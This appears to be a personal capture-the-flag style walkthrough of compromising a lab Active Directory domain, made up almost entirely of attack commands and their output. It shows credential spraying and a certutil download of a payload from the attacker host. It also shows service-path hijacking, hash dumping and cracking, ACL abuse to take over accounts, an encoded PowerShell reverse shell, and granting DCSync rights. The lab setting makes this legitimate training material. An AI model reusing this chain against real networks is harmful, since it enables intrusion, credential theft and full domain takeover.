target discovery and domain
```sh
┌──(kali㉿kali)-[~]
└─$ netexec smb 10.0.2.0/24                                     
SMB         10.0.2.1        445    DESKTOP-CIVQJ2K  [*] Windows 11 / Server 2025 Build 26100 x64 (name:DESKTOP-CIVQJ2K) (domain:DESKTOP-CIVQJ2K) (signing:True) (SMBv1:None)
SMB         10.0.2.9        445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hackerblueprint.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.2.35       445    CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-1) (domain:hackerblueprint.local) (signing:False) (SMBv1:None)
SMB         10.0.2.36       445    CLIENT-2         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-2) (domain:hackerblueprint.local) (signing:False) (SMBv1:None)

```
![[Pasted image 20260818094035.png]]

spray creds. We have Client2 RDP pwned
```sh
┌──(kali㉿kali)-[~/writeups/ad/AD10]
└─$ nxc-sweep 10.0.2.36 -u hclarke -p 'Cuba-libre72'
[*] Starting NXC sweep for 10.0.2.36 as hclarke ...
                                                                                                                                                                                                                   
[+] Port 445 open. Checking smb ...                                                                                                                                                                                
SMB         10.0.2.36       445    CLIENT-2         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-2) (domain:hackerblueprint.local) (signing:False) (SMBv1:None)                                       
SMB         10.0.2.36       445    CLIENT-2         [+] hackerblueprint.local\hclarke:Cuba-libre72 
SMB         10.0.2.36       445    CLIENT-2         [*] Enumerated shares
SMB         10.0.2.36       445    CLIENT-2         Share           Permissions     Remark
SMB         10.0.2.36       445    CLIENT-2         -----           -----------     ------
SMB         10.0.2.36       445    CLIENT-2         ADMIN$                          Remote Admin
SMB         10.0.2.36       445    CLIENT-2         C$                              Default share
SMB         10.0.2.36       445    CLIENT-2         IPC$            READ            Remote IPC

[+] Port 5985 open. Checking winrm ...
WINRM       10.0.2.36       5985   CLIENT-2         [*] Windows 10 / Server 2019 Build 19041 (name:CLIENT-2) (domain:hackerblueprint.local)                                                                        
WINRM       10.0.2.36       5985   CLIENT-2         [-] hackerblueprint.local\hclarke:Cuba-libre72

[+] Port 3389 open. Checking rdp ...
RDP         10.0.2.36       3389   CLIENT-2         [*] Windows 10 or Windows Server 2016 Build 19041 (name:CLIENT-2) (domain:hackerblueprint.local) (nla:True)                                                    
RDP         10.0.2.36       3389   CLIENT-2         [+] hackerblueprint.local\hclarke:Cuba-libre72 (Pwn3d!)

```
![[Pasted image 20260818094500.png]]

collect bloodhound data and start bloodhound
![[Pasted image 20260818095058.png]]
nothing interesting on bloodhound

get usernames
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD10/loot]
└─$ netexec ldap 10.0.2.9 -u 'hclarke' -p 'Cuba-libre72' --users
LDAP        10.0.2.9        389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hackerblueprint.local) (signing:None) (channel binding:No TLS cert) 
LDAP        10.0.2.9        389    DC01             [+] hackerblueprint.local\hclarke:Cuba-libre72 
LDAP        10.0.2.9        389    DC01             [*] Enumerated 13 domain users: hackerblueprint.local
LDAP        10.0.2.9        389    DC01             -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        10.0.2.9        389    DC01             Administrator                 2026-06-10 04:38:25 0        Built-in account for administering the computer/domain      
LDAP        10.0.2.9        389    DC01             Guest                         <never>             0        Built-in account for guest access to the computer/domain    
LDAP        10.0.2.9        389    DC01             krbtgt                        2026-06-18 10:56:09 0        Key Distribution Center Service Account                     
LDAP        10.0.2.9        389    DC01             acooper                       2026-06-18 11:19:18 0                                                                    
LDAP        10.0.2.9        389    DC01             kmitchell                     2026-06-18 11:19:18 0                                                                    
LDAP        10.0.2.9        389    DC01             lwallace                      2026-06-18 11:19:18 0                                                                    
LDAP        10.0.2.9        389    DC01             jreynolds                     2026-06-18 11:19:18 0                                                                    
LDAP        10.0.2.9        389    DC01             svc_backup                    2026-06-18 11:19:18 0                                                                    
LDAP        10.0.2.9        389    DC01             svc_monitor                   2026-06-18 11:19:18 0                                                                    
LDAP        10.0.2.9        389    DC01             pmorris                       2026-06-18 11:19:18 0                                                                    
LDAP        10.0.2.9        389    DC01             hclarke                       2026-06-18 11:19:19 0                                                                    
LDAP        10.0.2.9        389    DC01             rbennett                      2026-06-18 11:19:19 0                                                                    
LDAP        10.0.2.9        389    DC01             svc_scan                      2026-06-18 11:19:19 0   
```
![[Pasted image 20260818121445.png]]

okay rdp to Client1. PrivescCheck.ps1
``` sh
ServiceName : AppLogService

Path : C:\Program Files\AppLogService\applog.exe

ModifiablePath : @{ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users; Permissions=AppendData/AddSubdirectory}

StartName : LocalSystem

AbuseFunction : Write-ServiceBinary -Name 'AppLogService' -Path <HijackPath>

CanRestart : False

Name : AppLogService

Check : Unquoted Service Paths

ServiceName : AppLogService

Path : C:\Program Files\AppLogService\applog.exe

ModifiablePath : @{ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users; Permissions=System.Object[]}

StartName : LocalSystem

AbuseFunction : Write-ServiceBinary -Name 'AppLogService' -Path <HijackPath>

CanRestart : False

Name : AppLogService

Check : Unquoted Service Paths
```

Exploit AppLogService
make msfvenom payload and move target
``` sh
PS C:\Users\hclarke\Documents> certutil -urlcache -split -f "http://10.0.2.4:80/shell.exe" shell.exe
****  Online  ****
  0000  ...
  1e00
CertUtil: -URLCache command completed successfully.
PS C:\Users\hclarke\Documents> reg add HKLM\SYSTEM\CurrentControlSet\services\AppLogService /v ImagePath /t REG_EXPAND_SZ /d C:\Users\hclarke\Documents\shell.exe /f
The operation completed successfully.
```

start listener and restart machine catch shell as system
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD10/exploit]
└─$ penelope -p 443

[+] Added readline support...
[+] Interacting with session [1] • Readline • Menu key Ctrl-D ⇐
[+] Session log: /home/kali/.penelope/sessions/CLIENT-2~10.0.2.36-Microsoft_Windows_10_Pro-x64-based_PC/2026_08_18-05_52_22-035-nt authority\system.log
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>hostname
hostname
CLIENT-2
****
```
![[Pasted image 20260818125304.png]]

add hclarke to admin group
``` sh
C:\Windows\system32>net localgroup "Administrators" hclarke /add
net localgroup "Administrators" hclarke /add
The command completed successfully.

```

secrets dump as hclarke
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD10/exploit]
└─$ impacket-secretsdump hclarke@10.0.2.36                       

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x2401d31756d3c4b3d7549813f6be78f2
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:c0d0bcda5356be96f77c0dccb49fb1a0:::
Rachel:1002:aad3b435b51404eeaad3b435b51404ee:e618ab47ea4179bb6199a16daff38b5b:::
[*] Dumping cached domain logon information (domain/username:hash)
HACKERBLUEPRINT.LOCAL/acooper:$DCC2$10240#acooper#a1e8cc6863faaa560d068c3bfbd30d9b: (2026-06-18 15:26:04+00:00)
HACKERBLUEPRINT.LOCAL/hclarke:$DCC2$10240#hclarke#3ea37009c8459f519df4e8c0940a800c: (2026-08-18 09:16:08+00:00)

```
![[Pasted image 20260818125459.png]]

crack acooper hash
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD10/loot]
└─$ john hash_acooper --wordlist=/usr/share/wordlists/rockyou.txt 
Warning: detected hash type "mscash2", but the string is also recognized as "HMAC-MD5"
Use the "--format=HMAC-MD5" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (mscash2, MS Cache Hash 2 (DCC2) [PBKDF2-SHA1 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Babygirl#1       (HACKERBLUEPRINT.LOCAL/acooper) 
```
![[Pasted image 20260818125745.png]]

now we have some options on the bloodhound.
![[Pasted image 20260818130311.png]]

take control of pmorris and change passwd
``` sh
┌──(kali㉿kali)-[~/AD/targetedKerberoast]
└─$ impacket-owneredit -action write -new-owner 'acooper' -target 'pmorris' 'hackerblueprint.local'/'acooper':'Babygirl#1' -dc-ip 10.0.2.9       
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-3501607966-2179422509-1876789139-1105
[*] - sAMAccountName: acooper
[*] - distinguishedName: CN=Amanda Cooper,CN=Users,DC=hackerblueprint,DC=local
[*] OwnerSid modified successfully!
                                                                                                                                                                                                                   
┌──(kali㉿kali)-[~/AD/targetedKerberoast]
└─$ impacket-dacledit -action 'write' -rights 'FullControl' -principal 'acooper' -target 'pmorris' 'hackerblueprint.local'/'acooper':'Babygirl#1' -dc-ip 10.0.2.9
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20260818-063718.bak
[*] DACL modified successfully!
                                                                                                                                                                                                                   
┌──(kali㉿kali)-[~/AD/targetedKerberoast]
└─$ net rpc password 'pmorris' 'Babygirl#1' -U 'hackerblueprint.local'/'acooper'%'Babygirl#1' -S '10.0.2.9'

```
![[Pasted image 20260818133939.png]]

test creds
![[Pasted image 20260818133949.png]]

login as pmorris and privesc.

he has SeDebugPrivs

exploit with [[SeDebugPrivilege]]

``` sh
*Evil-WinRM* PS C:\Users\pmorris\Documents> .\SeDebugPrivesc.exe 604 "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMAAuADIALgA0ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="

```

gain system shell, add pmorris as admin
```sh
┌──(kali㉿kali)-[~/writeups/ad/AD10/exploit]
└─$ penelope -p 4444                                                        
<REDACTED>

Session ID <1>
[+] Added readline support...
[+] Interacting with session [1] • Readline • Menu key Ctrl-D ⇐
[+] Session log: /home/kali/.penelope/sessions/CLIENT-1~10.0.2.35-Microsoft_Windows_10_Pro-x64-based_PC/2026_08_18-07_08_43-581-nt authority\system.log
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
PS C:\Users\pmorris\Documents> whoami
nt authority\system
PS C:\Users\pmorris\Documents> hostname
CLIENT-1
PS C:\Users\pmorris\Documents> net localgroup "Administrators" pmorris /add
The command completed successfully.

```
![[Pasted image 20260818141141.png]]

dump secrets. Found lwallace hash
``` sh
┌──(kali㉿kali)-[~/privesc/win]
└─$ impacket-secretsdump pmorris@10.0.2.35                       

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x2401d31756d3c4b3d7549813f6be78f2
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:c0d0bcda5356be96f77c0dccb49fb1a0:::
Richard:1001:aad3b435b51404eeaad3b435b51404ee:e618ab47ea4179bb6199a16daff38b5b:::
Brian:1002:aad3b435b51404eeaad3b435b51404ee:e618ab47ea4179bb6199a16daff38b5b:::
[*] Dumping cached domain logon information (domain/username:hash)
HACKERBLUEPRINT.LOCAL/lwallace:$DCC2$10240#lwallace#1a858c54f4e43fbed9ce8df6360c64a3: (2026-06-18 15:27:04+00:00)

```
![[Pasted image 20260818141236.png]]

crack it offline

```sh
┌──(kali㉿kali)-[~/writeups/ad/AD10/loot]
└─$ john hash_lwallace --wordlist=/usr/share/wordlists/rockyou.txt 
Warning: detected hash type "mscash2", but the string is also recognized as "HMAC-MD5"
Use the "--format=HMAC-MD5" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (mscash2, MS Cache Hash 2 (DCC2) [PBKDF2-SHA1 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Frankie7!        (HACKERBLUEPRINT.LOCAL/lwallace) 
```
![[Pasted image 20260818141454.png]]

from bloodhound we can see he has WriteDacl on the domain
![[Pasted image 20260818141605.png]]

exploit
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD10/loot]
└─$ impacket-dacledit -action 'write' -rights 'DCSync' -principal 'lwallace' -target-dn 'DC=HACKERBLUEPRINT,DC=LOCAL' 'hackerblueprint.local'/'lwallace':'Frankie7!'     
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20260818-071729.bak
[*] DACL modified successfully!

```

Then did secrets dump. VM crashed and couldn't copy paste
![[Pasted image 20260818142141.png]]